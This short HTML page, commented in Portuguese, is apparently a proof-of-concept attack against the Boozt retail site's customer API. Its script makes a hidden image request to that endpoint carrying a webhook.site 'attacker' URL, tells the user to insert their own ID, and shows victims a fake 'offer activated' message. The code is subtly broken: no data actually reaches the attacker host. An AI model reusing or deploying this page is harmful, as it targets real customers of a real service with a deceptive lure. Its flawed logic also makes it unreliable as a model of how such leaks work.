<!DOCTYPE html>
<html>
<body>
    <script>
        // URL do endpoint da Boozt
        const booztUrl = "https://www.boozt.com/at/de-at/api/customer";
        // URL do atacante (usando webhook.site como exemplo realista)
        const attackerUrl = "https://webhook.site/4c60a68b-d724-4f53-a140-8f6a7b7af1be"; // Substitua pelo seu ID

        // Dispara a requisição como uma imagem pra enviar os dados ao atacante
        const img = new Image();
        img.src = booztUrl + "?leak=" + encodeURIComponent(attackerUrl);
        img.onerror = function() {
            // Mesmo que a imagem "falhe" (esperado), a requisição foi feita
            document.body.innerHTML = "Oferta ativada! Confira os detalhes.";
        };
    </script>
</body>
</html>
